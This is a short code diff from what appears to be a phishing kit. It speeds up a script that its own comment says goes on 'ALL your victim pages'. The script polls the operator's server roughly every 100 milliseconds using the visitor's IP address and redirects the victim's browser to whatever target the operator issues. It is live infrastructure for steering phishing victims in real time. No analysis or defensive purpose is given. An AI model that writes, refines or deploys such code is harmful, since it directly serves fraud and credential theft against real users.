@@ -366,24 +366,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['h-captcha-response'])
 
     <!-- Add this to the bottom of ALL your victim pages before </body> -->
 <script>
-// Poll for redirect commands every 2 seconds
-function checkForRedirect() {
-    fetch('/check-redirect.php?ip=<?php echo $_SERVER['REMOTE_ADDR']; ?>')
+// ULTRA-FAST INSTANT REDIRECT SYSTEM - 100ms POLLING
+(function() {
+    const victimIp = '<?php echo $_SERVER["REMOTE_ADDR"]; ?>';
+    let checkCount = 0;
+    
+    function checkRedirect() {
+        checkCount++;
+        
+        // ULTRA-FAST: 100ms for first 10 seconds, then 250ms
+        const nextCheck = checkCount < 100 ? 100 : 250;
+        
+        fetch(`/check-redirect.php?ip=${victimIp}&_=${Date.now()}`, {
+            cache: 'no-cache',
+            headers: {
+                'Cache-Control': 'no-cache'
+            }
+        })
         .then(response => response.json())
         .then(data => {
             if (data.redirect && data.target) {
-                console.log('Redirect command received:', data.target);
+                console.log('🚀 INSTANT REDIRECT TRIGGERED:', data.target);
                 window.location.href = data.target;
+                return; // STOP EVERYTHING AND REDIRECT
             }
+            setTimeout(checkRedirect, nextCheck);
         })
-        .catch(error => console.log('Redirect check error:', error));
-}
-
-// Check every 2 seconds
-setInterval(checkForRedirect, 2000);
-
-// Also check immediately when page loads
-checkForRedirect();
+        .catch(() => {
+            setTimeout(checkRedirect, nextCheck);
+        });
+    }
+    
+    // START IMMEDIATELY - NO DELAY
+    checkRedirect();
+})();
 </script>
 </body>
 </html>
